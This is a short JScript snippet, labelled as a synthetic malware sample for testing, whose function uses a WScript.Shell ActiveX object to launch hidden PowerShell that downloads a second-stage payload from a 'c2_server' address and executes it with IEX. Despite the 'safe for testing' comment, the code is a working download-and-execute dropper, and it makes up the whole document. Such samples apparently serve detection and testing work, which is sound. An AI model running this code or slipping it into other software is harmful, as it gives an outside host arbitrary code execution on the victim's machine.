// SYNTHETIC MALWARE SNIPPET - SAFE FOR TESTING
function invoke_payload() {
    var c2_server = "http://192.168.1.99:8080/stage2.bin";
    var dropper = new ActiveXObject("WScript.Shell");
    dropper.Run("powershell.exe -w hidden -c IEX(New-Object Net.WebClient).DownloadString('" + c2_server + "')");
}
